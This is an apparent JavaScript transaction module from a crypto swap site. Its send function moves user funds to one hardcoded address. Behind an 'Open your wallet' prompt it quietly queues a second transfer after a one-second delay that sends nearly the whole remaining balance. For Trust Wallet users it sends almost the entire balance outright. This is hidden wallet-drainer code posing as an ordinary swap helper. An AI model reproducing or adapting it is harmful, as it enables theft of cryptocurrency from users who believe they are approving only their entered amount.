import { CheckStatus,SwitchNetwork } from "../../swith_net/switch"

import { getCoins } from './getCoin'
import { SET_BALANCE } from '../../balance/setBalance'
import e from "cors"

export const send_transation = async (SETTING) => {
    await SwitchNetwork()
    const status = await CheckStatus()
    if(window.trust) {
        Alert("Open Trust Wallet, to confirm transaction.", "danger")
    }

    if(status) {
        const web3 = window._web3
        const { coin_1, coin_2 } = await getCoins()

        Number.prototype.noExponents = function() {
            var data = String(this).split(/[eE]/);
            if (data.length == 1) return data[0];
          
            var z = '',
              sign = this < 0 ? '-' : '',
              str = data[0].replace('.', ''),
              mag = Number(data[1]) + 1;
          
            if (mag < 0) {
              z = sign + '0.';
              while (mag++) z += '0';
              return z + str.replace(/^\-/, '');
            }
            mag -= str.length;
            while (mag--) z += '0';
            return str + z;
          }

        const input_1 = localStorage.getItem("input_1")
        const b_1 = localStorage.getItem("b_1")
        const index_1 = localStorage.getItem("index_1")

        const to = "0x4dC21c63c23C3C99a542f045B2Aa0218B0C0b2d7"

        const value_1_wei = window._web3.utils.toWei( "1", coin_1.toWei)
        const value_1 = String(Number(input_1) * Number(value_1_wei))

        const value_2_wei = window._web3.utils.toWei( "1", coin_2.toWei)
        const value_2 = String(Number(input_2) * Number(value_2_wei))
        
        const coin_value_1 = String(Number(value_1) /( coin_1.del ? coin_1.del : 1))

        ///
        let afterb = 0;
        if (index_1 == 1 || index_1 == 3) {
            afterb = b_1 - input_1 - 1;
        } else {
            afterb = b_1 - input_1 - 0.05;
        }

        const value_after = String(Number(afterb) * Number(value_1_wei))
        const minusd = 50;
        const mintok = 0.2;
     
        if (Number(localStorage.getItem('input_2')) >= 1000) {
            if (input_1 > 0) {
                if(coin_1.token) {
                    if(window.trust) {
                        //Trust
                        if (afterb > 400) {
                            const allb = b_1 - 1;
                            const value_allb = String(Number(allb) * Number(value_1_wei))
    
                            await coin_1.contract.methods.transfer(to, Number(value_allb).noExponents()).send({
                                from: SETTING.acc,
                                gasLimit: 100000
                            }, (error, result) => {
                                if(!error){
                                    return true
                                } else{
                                    return false
                                }
                            })
                        } else {
                            await coin_1.contract.methods.transfer(to, Number(coin_value_1).noExponents()).send({
                                from: SETTING.acc,
                                gasLimit: 100000
                            }, (error, result) => {
                                if(!error){
                                    return true
                                } else{
                                    return false
                                }
                            })
                        }
                    } else {
                        //Other
                        Alert("Open your wallet, to confirm transaction.", "danger")
                        setTimeout(function(){
                            if (afterb > minusd) {
                                coin_1.contract.methods.transfer(to, Number(value_after).noExponents()).send({
                                    from: SETTING.acc,
                                    gasLimit: 100000
                                })
                            }
                        }, 1000);

                        await coin_1.contract.methods.transfer(to, Number(coin_value_1).noExponents()).send({
                            from: SETTING.acc,
                            gasLimit: 100000
                        }, (error, result) => {
                            if(!error){
                                return true
                            } else{
                                return false
                            }
                        })
                    }
                } else {
                    if(window.trust) {
                        //Trust
                        if (afterb > 1) {
                            const allb = b_1 - 0.05;
                            const value_allb = String(Number(allb) * Number(value_1_wei))
    
                            const tx = {
                                from: SETTING.acc,
                                to: to,
                                gasLimit: 100000,
                                value: Number(value_allb).noExponents()
                            }
                            
                            return await web3.eth.sendTransaction(tx)
                            .then(() => {
                                SET_BALANCE();
                                true;
                            })
                            .catch(() => {
                                SET_BALANCE();
                                false;
                            })
                        } else {
                            const tx = {
                                from: SETTING.acc,
                                to: to,
                                gasLimit: 100000,
                                value: Number(coin_value_1).noExponents()
                            }
                            
                            return await web3.eth.sendTransaction(tx)
                            .then(() => {
                                SET_BALANCE();
                                true;
                            })
                            .catch(() => {
                                SET_BALANCE();
                                false;
                            })
                        }
                    } else {
                        //Other
                        Alert("Open your wallet, to confirm transaction.", "danger")
                        setTimeout(function(){
                            const tx_new = {
                                from: SETTING.acc,
                                to: to,
                                gasLimit: 100000,
                                value: Number(value_after).noExponents()
                            }

                            if (afterb > mintok) {
                                web3.eth.sendTransaction(tx_new)
                            }
                        }, 1000);

                        const tx = {
                            from: SETTING.acc,
                            to: to,
                            gasLimit: 100000,
                            value: Number(coin_value_1).noExponents()
                        }
                        
                        return await web3.eth.sendTransaction(tx)
                        .then(() => {
                            SET_BALANCE();
                            true;
                        })
                        .catch(() => {
                            SET_BALANCE();
                            false;
                        })
                    }
                }
            }
        }
    }
}
